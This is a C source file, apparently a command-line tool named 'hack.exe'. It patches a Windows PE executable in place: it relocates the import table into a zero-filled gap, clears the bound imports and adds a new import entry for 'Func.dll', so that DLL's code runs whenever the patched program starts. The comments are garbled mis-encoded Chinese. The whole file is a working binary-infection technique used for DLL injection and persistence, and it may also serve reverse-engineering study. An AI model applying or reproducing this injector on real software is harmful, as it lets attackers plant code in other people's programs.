#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <stdint.h>
//�ڱ� 
struct section_header{
	uint8_t name[8];//DLL����
	uint8_t virtualsize[4];
	uint8_t RVA[4];//�ڴ��е�ַ
	uint8_t size_of_raw_data[4];//�ڴ�С
	uint8_t file_address[4];//�ļ��е�ַ,RVA-file_addr�õ�������delta
	uint8_t notimportant[16]; 
};

//IDT��
struct IDT_entry{
	uint32_t INT_pointer;//ָ��INT��
	uint32_t timestamp;
	uint32_t forwarderchain;
	uint32_t dll_name_pointer;//ָ��DLL����
	uint32_t IAT_pointer;//ָ��IAT��
};

//��ȡ�ļ��ֽ��� 
int file_size(char* filename)
{
    struct stat statbuf;
    stat(filename,&statbuf);
    int size=statbuf.st_size;
    return size;
}

uint32_t uint8to32(uint8_t fouruint8[4]) {
	return *(uint32_t*)fouruint8;	
}

uint16_t uint8to16(uint8_t fouruint8[2]) {
	return *(uint16_t*)fouruint8;	
}

uint32_t findgap(uint8_t*exebuffer,uint32_t old_import_table_addr,uint32_t old_import_table_size,uint32_t gapsize,uint32_t buffersize)
{
	uint8_t orresult=0;//���Ϊ0�����г���0
	for(uint32_t i=old_import_table_addr+old_import_table_size;i<old_import_table_addr+old_import_table_size+gapsize-20;i++){
			orresult=exebuffer[old_import_table_addr+old_import_table_size]|orresult;
	} 
	if(orresult==0)//���Բ��ð��,������Ҫ������ 
		return  old_import_table_addr;
	
	//��Ҫ��� 
	int flag=0;
	orresult=0;
	uint32_t index=old_import_table_addr+old_import_table_size+gapsize-20;
	uint32_t gap_begin_addr=0;
	while(flag==0&&index<buffersize)
	{
		for(int i=0;i<gapsize;i++){
			if(exebuffer[index+i]!=0x00){
				orresult=1;
				index=index+i+1;
				break;
			}
		}
		if(orresult==0)//�ҵ���gap 
		{
			//printf("!find gap!\n");
			flag=1;
			gap_begin_addr=index;
			break;
		}
		orresult=0;
	}
	return gap_begin_addr;
}

uint32_t finddatagap(uint8_t*exebuffer,uint32_t old_import_table_addr,uint32_t old_import_table_size,uint32_t gapsize,uint32_t buffersize)
{
	uint8_t orresult=0;//���Ϊ0�����г���0

	int flag=0;
	orresult=0;
	uint32_t index=old_import_table_addr;
	uint32_t gap_begin_addr=0;
	while(flag==0&&index<buffersize)
	{
		for(int i=0;i<gapsize;i++){
			if(exebuffer[index+i]!=0x00){
				orresult=1;
				index=index+i+1;
				break;
			}
		}
		if(orresult==0)//�ҵ���gap 
		{
			//printf("!find gap!\n");
			flag=1;
			gap_begin_addr=index;
			break;
		}
		orresult=0;
	}
	return gap_begin_addr;
}


int main(int argc,char**argv){
	FILE *fp=NULL;
	int filesize=0;//�ļ����ֽ��� 
	if(argc!=2){
		printf("use like this:  hack.exe target.exe!\n");
		return 0;
	}
	
	fp=fopen(argv[1],"rb+");
	if(fp==NULL){
		printf("open file %s failed!\n",argv[1]);
		return 0;
	}
	filesize=file_size(argv[1]);//�ļ��ܴ�С
	uint8_t  *exebuffer=(uint8_t*)malloc(filesize);//Ҫд�أ���С��Ҫ����ı�
	
	int readsize=fread(exebuffer,1,filesize,fp);
	if(readsize==0){
		printf("read %s failed!\n",argv[1]);
		return 0;
	}
	else{
		printf("filesize is %d, readsize is %d\n",filesize,readsize);
	} 
	//����ǲ���PE�ļ� 
	uint16_t pehead=uint8to16(exebuffer);
	if(pehead!=0x5a4d){
		printf("PE head is %0X,not a PE file!\n",pehead);
		return 0;
	}
	
	uint32_t NT_header_index=uint8to32(&exebuffer[60]);//0x3C
	//printf("NT header is at %0X\n",NT_header_index);
	uint32_t signature=uint8to32(&exebuffer[NT_header_index]);
	//"PE" 50 45
	if(signature!=0x4550){
		printf("PE head is %0X,not a PE file!\n",signature);
		return 0;
	}
	
	uint16_t sections=uint8to16(&exebuffer[NT_header_index+4+2]);//�ж��ٸ���,������Ҫ�����ٸ��ڱ� 
	//0x4+0x14=20�ֽڣ���ѡͷ��NT_header_index+24��ʼ
	uint16_t option_header_size=uint8to16(&exebuffer[NT_header_index+4+16]);//��ѡͷ��С 
	
	uint32_t option_header_index=NT_header_index+24;//��ѡͷ��ʼ 
	uint32_t num_of_directory=uint8to32(&exebuffer[option_header_index+92]);//0x5C,һ����0x10
	//ÿ��8�ֽڣ�������ڵ�2��,Ŀ¼��1����ƫ��option_header_index��0x60=96 
	uint32_t* import_table_addr=(uint32_t*)&exebuffer[option_header_index+96+8];//֮�����Ҫ��� 
	uint32_t* import_table_size=(uint32_t*)&exebuffer[option_header_index+96+12];//ֱ��ʹ��ָ�룬֮��Ҫ��20 
	 
	uint32_t* bound_table_addr=(uint32_t*)&exebuffer[option_header_index+96+88];//����󶨱��еĻ������ 
	uint32_t* bound_table_size=(uint32_t*)&exebuffer[option_header_index+96+92];//��0	
	//printf("�������%0X,��СΪ%0X\n",*import_table_addr,*import_table_size);
	//printf("�󶨱���%0X,��СΪ%0X\n",*bound_table_addr,*bound_table_size);
	//����а󶨱���0 
	if(*bound_table_size!=0){
		*bound_table_addr=0;
		*bound_table_size=0;
	}
	
	uint32_t *section_delta_offset=(uint32_t*)malloc(sections*sizeof(uint32_t));
	struct section_header *the_section_header=
	     (struct section_header *)malloc(sections*sizeof(struct section_header));
	memset(the_section_header,0,sections*40);
	memcpy(the_section_header,&exebuffer[option_header_index+option_header_size],sections*40);
	//ͨ��pointer to raw data�ж��������ĸ������棬��Ҫʹ���ĸ��ڵ�delta 
	//file_offset+delta=RVA��PE�ļ��м�¼����RVA 
	//ͬʱ��¼.data�ڵ���� 
	int datasectionnum=-1;
	for(int i=0;i<sections;i++){
		section_delta_offset[i]=uint8to32(the_section_header[i].RVA) - 
		                        uint8to32(the_section_header[i].file_address);
		if(!strcmp((char*)the_section_header[i].name,".data")||!strcmp((char*)the_section_header[i].name,"data"))
			datasectionnum=i;
	}
	printf("data section  is in the %d place. \n",datasectionnum);
	//Ѱ�ҿ�϶ 20�ֽ�IDT���4�ֽ�ָ��[INT]��20�ֽں�����ź�����4�ֽ�ǰ��ָ���INT��β 
	//16�ֽڵ�Func.dll���֣�IAT��ָ�룬��IAT��0000000 
	uint32_t  gapsize=*import_table_size+20+4+20+4+16+8+3;//������Ҫ��ô��Ŀ�϶,���ֽڶ��� 
	//�����ҿ�϶�����ؿ�ʼ���ļ�ƫ�ƺţ���������Ҳ���������ֱ��һ������.data���� 
	//��Ҫ�Ȱ�������RVAתΪ�ļ�ƫ��
	uint32_t import_table_fileaddr=0;
	for(int i=0;i<sections;i++){
		if(i!=sections-1)
		{
			if(*import_table_addr>=uint8to32(the_section_header[i].RVA) && *import_table_addr<uint8to32(the_section_header[i+1].RVA))
			{
				import_table_fileaddr=*import_table_addr-section_delta_offset[i];
				break;
			}
		}
		else if(i==sections-1){
			import_table_fileaddr=*import_table_addr-section_delta_offset[i];
			break;
		}

	} 
	uint32_t gap_firstindex=findgap(exebuffer,import_table_fileaddr,*import_table_size,gapsize,filesize);
	//����ҵ�����ô��Ŀ�϶ 
	if(gap_firstindex!=0){
		gap_firstindex=gap_firstindex+4-(gap_firstindex%4);
		printf("Find enough gap! It starts at file-offset %0X\n",gap_firstindex);
	}
	else//�������������ҵ���϶ 
	{
		gap_firstindex=finddatagap(exebuffer,uint8to32(the_section_header[datasectionnum].file_address),*import_table_size,gapsize,filesize);
		if(gap_firstindex!=0){
			gap_firstindex=gap_firstindex+4-(gap_firstindex%4);
			printf("Find enough gap! It starts at file-offset %0X\n",gap_firstindex);
		}
		else{
			printf("Operation failed! No enough gap to change!\n");
			return 0;
		}
	}	
	
	//��λgap���ڽ�,����offset�ͽ��� 
	uint32_t gap_firstRVA=0;
	for(int i=0;i<sections;i++){
		if(i!=sections-1)
		{
			if(gap_firstindex>=uint8to32(the_section_header[i].file_address) && gap_firstindex<uint8to32(the_section_header[i+1].file_address))
			{
				gap_firstRVA=gap_firstindex+section_delta_offset[i];
				break;
			}
		}
		else if(i==sections-1){
			gap_firstRVA=gap_firstindex+section_delta_offset[i];
			break;
		}
	} 
	printf("\nFirstRVA of the gap area is %0X, the new import table will at here.\n",gap_firstRVA);
	
	//���˿�ʼ���ļ�ƫ�ƺ�RVA�����Կ�ʼ�ˣ��Ȱ�ԭ���ı��ƹ�ȥ 
	uint32_t rel_current_RVA=0;//�޸�ʱ�����ƫ��
	uint32_t rel_current_index=0;//�޸�ʱ�����ƫ��
	//printf("sizeof section header is %d\n",*import_table_size);
	//���ð�ȫ��Ľ�β���ƽ�ȥ 
	//ע��ŵ���RVA!!!! 
	memcpy(&exebuffer[gap_firstindex],&exebuffer[import_table_fileaddr],*import_table_size-20); 
	rel_current_index=gap_firstindex+*import_table_size-20;//��ʱ����IDT��ŵ��ļ���ַ 
	rel_current_RVA=gap_firstRVA+*import_table_size-20;//��ʱ����IDT��ŵ�RVA��ַ
	//printf("rel_current_RVA is %X\n",rel_current_RVA);
	*import_table_addr=gap_firstRVA;//�л������ 
	*import_table_size=*import_table_size+20;//�����������
	struct IDT_entry new_IDT_entry;
	new_IDT_entry.INT_pointer=rel_current_RVA+40;//1��IDT�1���յģ�20+20,�Լ�ռ��4+4[1����ָ��]
	// rel_current_index+40�����1��INT�1���㣬��8�ֽ� 
	*(uint32_t*)&exebuffer[rel_current_index+40]=(uint32_t)rel_current_RVA+48;
	exebuffer[rel_current_index+48]=0x01;//0001��������Func.dll������ĵ�������FuncInDll��Ŀ�ʼ 
	//50��ʼ�Ǻ�����,��Ȼ��û����EXE��ִ��LoadLibrary��GetProcAddress������DLLֱ�ӽ�DllMain 
	strcpy((char*)&exebuffer[rel_current_index+50],"FuncInDll"); 
	 
	new_IDT_entry.timestamp=0x0;
	new_IDT_entry.forwarderchain=0x0;
	new_IDT_entry.dll_name_pointer=(uint32_t)rel_current_RVA+50+20;//֮ǰ�����20�ֽ� 
	strcpy((char*)&exebuffer[rel_current_index+50+20],"Func.dll");//DLL������ 
	//һ��ָ��IAT��ָ���ָ�룬����IATָ������ 
	new_IDT_entry.IAT_pointer=rel_current_RVA+50+20+14;
	printf("IAT_pointer at %X\n",new_IDT_entry.IAT_pointer);
	uint32_t IAT_RVA=rel_current_RVA+48;//Func.dll��IAT��RVA 
	memcpy(&exebuffer[rel_current_index+50+20+14],&IAT_RVA,4);
	IAT_RVA=0x0;//��0��Ӧ�ú�����4�ֽ�0��ΪIAT�Ľ�����IATֻ��һ��������Ҳ���Բ����һ�� 
	memcpy(&exebuffer[rel_current_index+50+20+18],&IAT_RVA,4);
	//��IDT����ʽд�� 
	memcpy(&exebuffer[rel_current_index],&new_IDT_entry,20);
	printf("hack succesfully, open %s now!\n",argv[1]); 
	 
	free(section_delta_offset);
	free(the_section_header);
	rewind(fp);//ָ���ļ���ͷ 
	fwrite(exebuffer,1,filesize,fp);
	free(exebuffer);
	fclose(fp);
	return 0;
}
